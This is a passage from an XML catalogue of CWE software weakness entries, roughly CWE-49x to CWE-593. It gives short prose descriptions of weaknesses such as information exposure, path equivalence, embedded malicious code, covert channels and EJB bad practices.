  <description>Exposing system data or debugging information helps an adversary learn about the system and form an attack plan.An information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. An attacker can also cause errors to occur by submitting unusual requests to the web application. The response to these errors can reveal detailed system information, deny service, cause security mechanisms to fail, and crash the server. An attacker can use error messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. An application may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.</description>
</vulnerability>
<vulnerability label="CWE-498" name="Cloneable Class Containing Sensitive Information" type="Variant" reference="CWE">
  <description>The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.Cloneable classes are effectively open classes, since data cannot be hidden in them. Classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.</description>
</vulnerability>
<vulnerability label="CWE-499" name="Serializable Class Containing Sensitive Data" type="Variant" reference="CWE">
  <description>The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.Serializable classes are effectively open classes since data cannot be hidden in them. Classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.</description>
</vulnerability>
<vulnerability label="CWE-5" name="J2EE Misconfiguration: Data Transmission Without Encryption" type="Variant" reference="CWE">
  <description>Information sent over a network can be compromised while in transit. An attacker may be able to read/modify the contents if the data are sent in plaintext or are weakly encrypted.</description>
</vulnerability>
<vulnerability label="CWE-50" name="Path Equivalence: '//multiple/leading/slash'" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-500" name="Public Static Field Not Marked Final" type="Variant" reference="CWE">
  <description>An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.</description>
</vulnerability>
<vulnerability label="CWE-501" name="Trust Boundary Violation" type="Base" reference="CWE">
  <description>The product mixes trusted and untrusted data in the same data structure or structured message.By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.</description>
</vulnerability>
<vulnerability label="CWE-502" name="Deserialization of Untrusted Data" type="Variant" reference="CWE">
  <description>The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.Data that is untrusted can not be trusted to be well-formed.</description>
</vulnerability>
<vulnerability label="CWE-506" name="Embedded Malicious Code" type="Class" reference="CWE">
  <description>The application contains code that appears to be malicious in nature. Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of an application or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.</description>
</vulnerability>
<vulnerability label="CWE-507" name="Trojan Horse" type="Base" reference="CWE">
  <description>The software appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.</description>
</vulnerability>
<vulnerability label="CWE-508" name="Non-Replicating Malicious Code" type="Base" reference="CWE">
  <description>Non-replicating malicious code only resides on the target system or software that is attacked; it does not attempt to spread to other systems.</description>
</vulnerability>
<vulnerability label="CWE-509" name="Replicating Malicious Code (Virus or Worm)" type="Base" reference="CWE">
  <description>Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or software.</description>
</vulnerability>
<vulnerability label="CWE-51" name="Path Equivalence: '/multiple//internal/slash'" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-510" name="Trapdoor" type="Base" reference="CWE">
  <description>A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.</description>
</vulnerability>
<vulnerability label="CWE-511" name="Logic/Time Bomb" type="Base" reference="CWE">
  <description>The software contains code that is designed to disrupt the legitimate operation of the software (or its environment) when a certain time passes, or when a certain logical condition is met.When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.</description>
</vulnerability>
<vulnerability label="CWE-512" name="Spyware" type="Base" reference="CWE">
  <description>The software collects personally identifiable information about a human user or the user's activities, but the software accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the software.&quot;Spyware&quot; is a commonly used term with many definitions and interpretations. In general, it is meant to software that collects information or installs functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.</description>
</vulnerability>
<vulnerability label="CWE-514" name="Covert Channel" type="Class" reference="CWE">
  <description>A covert channel is a path used to transfer information in a way not intended by the system's designers.Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.</description>
</vulnerability>
<vulnerability label="CWE-515" name="Covert Storage Channel" type="Base" reference="CWE">
  <description>A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.</description>
</vulnerability>
<vulnerability label="CWE-516" name="DEPRECATED (Duplicate): Covert Timing Channel" type="Base" reference="CWE">
  <description>This weakness can be found at CWE-385.</description>
</vulnerability>
<vulnerability label="CWE-52" name="Path Equivalence: '/multiple/trailing/slash//'" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-520" name=".NET Misconfiguration: Use of Impersonation" type="Variant" reference="CWE">
  <description>Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.</description>
</vulnerability>
<vulnerability label="CWE-521" name="Weak Password Requirements" type="Base" reference="CWE">
  <description>The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.An authentication mechanism is only as strong as its credentials. For this reason, it is important to require users to have strong passwords. Lack of password complexity significantly reduces the search space when trying to guess user's passwords, making brute-force attacks easier.</description>
</vulnerability>
<vulnerability label="CWE-522" name="Insufficiently Protected Credentials" type="Base" reference="CWE">
  <description>This weakness occurs when the application transmits or stores authentication credentials and uses an insecure method that is susceptible to unauthorized interception and/or retrieval.</description>
</vulnerability>
<vulnerability label="CWE-523" name="Unprotected Transport of Credentials" type="Variant" reference="CWE">
  <description>Login pages not using adequate measures to protect the user name and password while they are in transit from the client to the server.</description>
</vulnerability>
<vulnerability label="CWE-524" name="Information Exposure Through Caching" type="Variant" reference="CWE">
  <description>The application uses a cache to maintain a pool of objects, threads, connections, pages, or passwords to minimize the time it takes to access them or the resources to which they connect. If implemented improperly, these caches can allow access to unauthorized information or cause a denial of service vulnerability.</description>
</vulnerability>
<vulnerability label="CWE-525" name="Information Exposure Through Browser Caching" type="Variant" reference="CWE">
  <description>For each web page, the application should have an appropriate caching policy specifying the extent to which the page and its form fields should be cached.</description>
</vulnerability>
<vulnerability label="CWE-526" name="Information Exposure Through Environmental Variables" type="Variant" reference="CWE">
  <description>Environmental variables may contain sensitive information about a remote server.</description>
</vulnerability>
<vulnerability label="CWE-527" name="Exposure of CVS Repository to an Unauthorized Control Sphere" type="Variant" reference="CWE">
  <description>The product stores a CVS repository in a directory or other container that is accessible to actors outside of the intended control sphere.Information contained within a CVS subdirectory on a web server or other server could be recovered by an attacker and used for malicious purposes. This information may include usernames, filenames, path root, and IP addresses.</description>
</vulnerability>
<vulnerability label="CWE-528" name="Exposure of Core Dump File to an Unauthorized Control Sphere" type="Variant" reference="CWE">
  <description>The product generates a core dump file in a directory that is accessible to actors outside of the intended control sphere.</description>
</vulnerability>
<vulnerability label="CWE-529" name="Exposure of Access Control List Files to an Unauthorized Control Sphere" type="Variant" reference="CWE">
  <description>The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.</description>
</vulnerability>
<vulnerability label="CWE-53" name="Path Equivalence: '\multiple\\internal\backslash'" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-530" name="Exposure of Backup File to an Unauthorized Control Sphere" type="Variant" reference="CWE">
  <description>A backup file is stored in a directory that is accessible to actors outside of the intended control sphere.Often, old files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.</description>
</vulnerability>
<vulnerability label="CWE-531" name="Information Exposure Through Test Code" type="Variant" reference="CWE">
  <description>Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.</description>
</vulnerability>
<vulnerability label="CWE-532" name="Information Exposure Through Log Files" type="Variant" reference="CWE">
  <description>Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.</description>
</vulnerability>
<vulnerability label="CWE-533" name="Information Exposure Through Server Log Files" type="Variant" reference="CWE">
  <description>A server.log file was found. This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.</description>
</vulnerability>
<vulnerability label="CWE-534" name="Information Exposure Through Debug Log Files" type="Variant" reference="CWE">
  <description>The application does not sufficiently restrict access to a log file that is used for debugging.</description>
</vulnerability>
<vulnerability label="CWE-535" name="Information Exposure Through Shell Error Message" type="Variant" reference="CWE">
  <description>A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.</description>
</vulnerability>
<vulnerability label="CWE-536" name="Information Exposure Through Servlet Runtime Error Message" type="Variant" reference="CWE">
  <description>A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.</description>
</vulnerability>
<vulnerability label="CWE-537" name="Information Exposure Through Java Runtime Error Message" type="Variant" reference="CWE">
  <description>In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.</description>
</vulnerability>
<vulnerability label="CWE-538" name="File and Directory Information Exposure" type="Base" reference="CWE">
  <description>The product stores sensitive information in files or directories that are accessible to actors outside of the intended control sphere.</description>
</vulnerability>
<vulnerability label="CWE-539" name="Information Exposure Through Persistent Cookies" type="Variant" reference="CWE">
  <description>Persistent cookies are cookies that are stored on the browser's hard drive. This can cause security and privacy issues depending on the information stored in the cookie and how it is accessed.Cookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session Identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory, and are not stored anywhere, but persistent cookies are stored on the browser's hard drive.</description>
</vulnerability>
<vulnerability label="CWE-54" name="Path Equivalence: 'filedir\' (Trailing Backslash)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of trailing backslash ('filedir\') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-540" name="Information Exposure Through Source Code" type="Variant" reference="CWE">
  <description>Source code on a web server often contains sensitive information and should generally not be accessible to users.There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.</description>
</vulnerability>
<vulnerability label="CWE-541" name="Information Exposure Through Include Source Code" type="Variant" reference="CWE">
  <description>If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.</description>
</vulnerability>
<vulnerability label="CWE-542" name="Information Exposure Through Cleanup Log Files" type="Variant" reference="CWE">
  <description>The application does not properly protect or delete a log file related to cleanup.</description>
</vulnerability>
<vulnerability label="CWE-543" name="Use of Singleton Pattern Without Synchronization in a Multithreaded Context" type="Variant" reference="CWE">
  <description>The software uses the singleton pattern when creating a resource within a multithreaded environment.The use of a singleton pattern may not be thread-safe.</description>
</vulnerability>
<vulnerability label="CWE-544" name="Missing Standardized Error Handling Mechanism" type="Base" reference="CWE">
  <description>The software does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.If the application handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user.</description>
</vulnerability>
<vulnerability label="CWE-545" name="Use of Dynamic Class Loading" type="Variant" reference="CWE">
  <description>Dynamically loaded code has the potential to be malicious.</description>
</vulnerability>
<vulnerability label="CWE-546" name="Suspicious Comment" type="Variant" reference="CWE">
  <description>The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.Many suspicious comments, such as BUG, HACK, FIXME, LATER, LATER2, TODO, in the code indicate missing security functionality and checking. Others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.</description>
</vulnerability>
<vulnerability label="CWE-547" name="Use of Hard-coded, Security-relevant Constants" type="Variant" reference="CWE">
  <description>The program uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.If the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. Making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. In addition, these hard-coded values may become available to attackers if the code is ever disclosed.</description>
</vulnerability>
<vulnerability label="CWE-548" name="Information Exposure Through Directory Listing" type="Variant" reference="CWE">
  <description>A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.</description>
</vulnerability>
<vulnerability label="CWE-549" name="Missing Password Field Masking" type="Variant" reference="CWE">
  <description>The software does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.</description>
</vulnerability>
<vulnerability label="CWE-55" name="Path Equivalence: '/./' (Single Dot Directory)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of single dot directory exploit ('/./') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-550" name="Information Exposure Through Server Error Message" type="Variant" reference="CWE">
  <description>Certain conditions, such as network failure, will cause a server error message to be displayed.While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.</description>
</vulnerability>
<vulnerability label="CWE-551" name="Incorrect Behavior Order: Authorization Before Parsing and Canonicalization" type="Base" reference="CWE">
  <description>If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed.</description>
</vulnerability>
<vulnerability label="CWE-552" name="Files or Directories Accessible to External Parties" type="Base" reference="CWE">
  <description>Files or directories are accessible in the environment that should not be.</description>
</vulnerability>
<vulnerability label="CWE-553" name="Command Shell in Externally Accessible Directory" type="Variant" reference="CWE">
  <description>A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.</description>
</vulnerability>
<vulnerability label="CWE-554" name="ASP.NET Misconfiguration: Not Using Input Validation Framework" type="Variant" reference="CWE">
  <description>The ASP.NET application does not use an input validation framework.</description>
</vulnerability>
<vulnerability label="CWE-555" name="J2EE Misconfiguration: Plaintext Password in Configuration File" type="Variant" reference="CWE">
  <description>The J2EE application stores a plaintext password in a configuration file.Storing a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resource, making it an easy target for attackers.</description>
</vulnerability>
<vulnerability label="CWE-556" name="ASP.NET Misconfiguration: Use of Identity Impersonation" type="Variant" reference="CWE">
  <description>Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.</description>
</vulnerability>
<vulnerability label="CWE-558" name="Use of getlogin() in Multithreaded Application" type="Variant" reference="CWE">
  <description>The application uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.The getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. The function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. This makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.</description>
</vulnerability>
<vulnerability label="CWE-56" name="Path Equivalence: 'filedir*' (Wildcard)" type="Variant" reference="CWE">
  <description>A software system that accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.</description>
</vulnerability>
<vulnerability label="CWE-560" name="Use of umask() with chmod-style Argument" type="Variant" reference="CWE">
  <description>The product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().</description>
</vulnerability>
<vulnerability label="CWE-561" name="Dead Code" type="Variant" reference="CWE">
  <description>The software contains dead code, which can never be executed.Dead code is source code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.</description>
</vulnerability>
<vulnerability label="CWE-562" name="Return of Stack Variable Address" type="Base" reference="CWE">
  <description>A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.</description>
</vulnerability>
<vulnerability label="CWE-563" name="Unused Variable" type="Variant" reference="CWE">
  <description>The variable's value is assigned but never used, making it a dead store.It is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.</description>
</vulnerability>
<vulnerability label="CWE-564" name="SQL Injection: Hibernate" type="Variant" reference="CWE">
  <description>Using Hibernate to execute a dynamic SQL statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.</description>
</vulnerability>
<vulnerability label="CWE-565" name="Reliance on Cookies without Validation and Integrity Checking" type="Base" reference="CWE">
  <description>The application relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.</description>
</vulnerability>
<vulnerability label="CWE-566" name="Authorization Bypass Through User-Controlled SQL Primary Key" type="Variant" reference="CWE">
  <description>The software uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor.When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.Database access control errors occur when: Data enters a program from an untrusted source.The data is used to specify the value of a primary key in a SQL query.The untrusted source does not have the permissions to be able to access all rows in the associated table.</description>
</vulnerability>
<vulnerability label="CWE-567" name="Unsynchronized Access to Shared Data in a Multithreaded Context" type="Base" reference="CWE">
  <description>The product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.Within servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. This is a typical programming mistake in J2EE applications, since the multithreading is handled by the framework. When a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable. Note that this weakness is not unique to servlets.</description>
</vulnerability>
<vulnerability label="CWE-568" name="finalize() Method Without super.finalize()" type="Variant" reference="CWE">
  <description>The software contains a finalize() method that does not call super.finalize().The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().</description>
</vulnerability>
<vulnerability label="CWE-57" name="Path Equivalence: 'fakedir/../realdir/filename'" type="Variant" reference="CWE">
  <description>The software contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. This allows attackers to perform unauthorized actions against the targeted file.</description>
</vulnerability>
<vulnerability label="CWE-570" name="Expression is Always False" type="Variant" reference="CWE">
  <description>The software contains an expression that will always evaluate to false.</description>
</vulnerability>
<vulnerability label="CWE-571" name="Expression is Always True" type="Variant" reference="CWE">
  <description>The software contains an expression that will always evaluate to true.</description>
</vulnerability>
<vulnerability label="CWE-572" name="Call to Thread run() instead of start()" type="Variant" reference="CWE">
  <description>The program calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.In most cases a direct call to a Thread object's run() method is a bug. The programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.</description>
</vulnerability>
<vulnerability label="CWE-573" name="Improper Following of Specification by Caller" type="Class" reference="CWE">
  <description>The software does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.When leveraging external functionality, such as an API, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.</description>
</vulnerability>
<vulnerability label="CWE-574" name="EJB Bad Practices: Use of Synchronization Primitives" type="Variant" reference="CWE">
  <description>The program violates the Enterprise JavaBeans (EJB) specification by using thread synchronization primitives.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: &quot;An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances.&quot; The specification justifies this requirement in the following way: &quot;This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs.&quot;</description>
</vulnerability>
<vulnerability label="CWE-575" name="EJB Bad Practices: Use of AWT Swing" type="Variant" reference="CWE">
  <description>The program violates the Enterprise JavaBeans (EJB) specification by using AWT/Swing.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: &quot;An enterprise bean must not use the AWT functionality to attempt to output information to a display, or to input information from a keyboard.&quot; The specification justifies this requirement in the following way: &quot;Most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system.&quot;</description>
</vulnerability>
<vulnerability label="CWE-576" name="EJB Bad Practices: Use of Java I/O" type="Variant" reference="CWE">
  <description>The program violates the Enterprise JavaBeans (EJB) specification by using the java.io package.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: &quot;An enterprise bean must not use the java.io package to attempt to access files and directories in the file system.&quot; The specification justifies this requirement in the following way: &quot;The file system APIs are not well-suited for business components to access data. Business components should use a resource manager API, such as JDBC, to store data.&quot;</description>
</vulnerability>
<vulnerability label="CWE-577" name="EJB Bad Practices: Use of Sockets" type="Variant" reference="CWE">
  <description>The program violates the Enterprise JavaBeans (EJB) specification by using sockets.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: &quot;An enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast.&quot; The specification justifies this requirement in the following way: &quot;The EJB architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. Allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the EJB clients.&quot;</description>
</vulnerability>
<vulnerability label="CWE-578" name="EJB Bad Practices: Use of Class Loader" type="Variant" reference="CWE">
  <description>The program violates the Enterprise JavaBeans (EJB) specification by using the class loader.The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: &quot;The enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the JVM; or change the input, output, and error streams.&quot; The specification justifies this requirement in the following way: &quot;These functions are reserved for the EJB container. Allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment.&quot;</description>
</vulnerability>
<vulnerability label="CWE-579" name="J2EE Bad Practices: Non-serializable Object Stored in Session" type="Variant" reference="CWE">
  <description>The application stores a non-serializable object as an HttpSession attribute, which can hurt reliability.</description>
</vulnerability>
<vulnerability label="CWE-58" name="Path Equivalence: Windows 8.3 Filename" type="Variant" reference="CWE">
  <description>The software contains a protection mechanism that restricts access to a long filename on a Windows operating system, but the software does not properly restrict access to the equivalent short &quot;8.3&quot; filename.On later Windows operating systems, a file can have a &quot;long name&quot; and a short name that is compatible with older Windows file systems, with up to 8 characters in the filename and 3 characters for the extension. These &quot;8.3&quot; filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.</description>
</vulnerability>
<vulnerability label="CWE-580" name="clone() Method Without super.clone()" type="Variant" reference="CWE">
  <description>The software contains a clone() method that does not call super.clone() to obtain the new object.All implementations of clone() should obtain the new object by calling super.clone(). If a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.</description>
</vulnerability>
<vulnerability label="CWE-581" name="Object Model Violation: Just One of Equals and Hashcode Defined" type="Base" reference="CWE">
  <description>The software does not maintain equal hashcodes for equal objects.Java objects are expected to obey a number of invariants related to equality. One of these invariants is that equal objects must have equal hashcodes. In other words, if a.equals(b) == true then a.hashCode() == b.hashCode().</description>
</vulnerability>
<vulnerability label="CWE-582" name="Array Declared Public, Final, and Static" type="Variant" reference="CWE">
  <description>The program declares an array public, final, and static, which is not sufficient to prevent the array's contents from being modified.Because arrays are mutable objects, the final constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. As such, in most cases an array declared public, final and static is a bug.</description>
</vulnerability>
<vulnerability label="CWE-583" name="finalize() Method Declared Public" type="Variant" reference="CWE">
  <description>The program violates secure coding principles for mobile code by declaring a finalize() method public.A program should never call finalize explicitly, except to call super.finalize() inside an implementation of finalize(). In mobile code situations, the otherwise error prone practice of manual garbage collection can become a security threat if an attacker can maliciously invoke one of your finalize() methods because it is declared with public access.</description>
</vulnerability>
<vulnerability label="CWE-584" name="Return Inside Finally Block" type="Base" reference="CWE">
  <description>The code has a return statement inside a finally block, which will cause any thrown exception in the try block to be discarded.</description>
</vulnerability>
<vulnerability label="CWE-585" name="Empty Synchronized Block" type="Variant" reference="CWE">
  <description>The software contains an empty synchronized block.An empty synchronized block does not actually accomplish any synchronization and may indicate a troubled section of code. An empty synchronized block can occur because code no longer needed within the synchronized block is commented out without removing the synchronized block.</description>
</vulnerability>
<vulnerability label="CWE-586" name="Explicit Call to Finalize()" type="Variant" reference="CWE">
  <description>The software makes an explicit call to the finalize() method from outside the finalizer.While the Java Language Specification allows an object's finalize() method to be called from outside the finalizer, doing so is usually a bad idea. For example, calling finalize() explicitly means that finalize() will be called more than once: the first time will be the explicit call and the last time will be the call that is made after the object is garbage collected.</description>
</vulnerability>
<vulnerability label="CWE-587" name="Assignment of a Fixed Address to a Pointer" type="Base" reference="CWE">
  <description>The software sets a pointer to a specific address other than NULL or 0.Using a fixed address is not portable because that address will probably not be valid in all environments or platforms.</description>
</vulnerability>
<vulnerability label="CWE-588" name="Attempt to Access Child of a Non-structure Pointer" type="Variant" reference="CWE">
  <description>Casting a non-structure type to a structure type and accessing a field can lead to memory access errors or data corruption.</description>
</vulnerability>
<vulnerability label="CWE-589" name="Call to Non-ubiquitous API" type="Variant" reference="CWE">
  <description>The software uses an API function that does not exist on all versions of the target platform. This could cause portability problems or inconsistencies that allow denial of service or other consequences.Some functions that offer security features supported by the OS are not available on all versions of the OS in common use. Likewise, functions are often deprecated or made obsolete for security reasons and should not be used.</description>
</vulnerability>
<vulnerability label="CWE-59" name="Improper Link Resolution Before File Access ('Link Following')" type="Base" reference="CWE">
  <description>The software attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.</description>
</vulnerability>
<vulnerability label="CWE-590" name="Free of Memory not on the Heap" type="Variant" reference="CWE">
  <description>The application calls free() on a pointer to memory that was not allocated using associated heap allocation functions such as malloc(), calloc(), or realloc().When free() is called on an invalid pointer, the program's memory management data structures may become corrupted. This corruption can cause the program to crash or, in some circumstances, an attacker may be able to cause free() to operate on controllable memory locations to modify critical program variables or execute code.</description>
</vulnerability>
<vulnerability label="CWE-591" name="Sensitive Data Storage in Improperly Locked Memory" type="Variant" reference="CWE">
  <description>The application stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.On Windows systems the VirtualLock function can lock a page of memory to ensure that it will remain present in memory and not be swapped to disk. However, on older versions of Windows, such as 95, 98, or Me, the VirtualLock() function is only a stub and provides no protection. On POSIX systems the mlock() call ensures that a page will stay resident in memory but does not guarantee that the page will not appear in the swap. Therefore, it is unsuitable for use as a protection mechanism for sensitive data. Some platforms, in particular Linux, do make the guarantee that the page will not be swapped, but this is non-standard and is not portable. Calls to mlock() also require supervisor privilege. Return values for both of these calls must be checked to ensure that the lock operation was actually successful.</description>
</vulnerability>
<vulnerability label="CWE-592" name="Authentication Bypass Issues" type="Class" reference="CWE">
  <description>The software does not properly perform authentication, allowing it to be bypassed through various methods.</description>
</vulnerability>
<vulnerability label="CWE-593" name="Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created" type="Variant" reference="CWE">
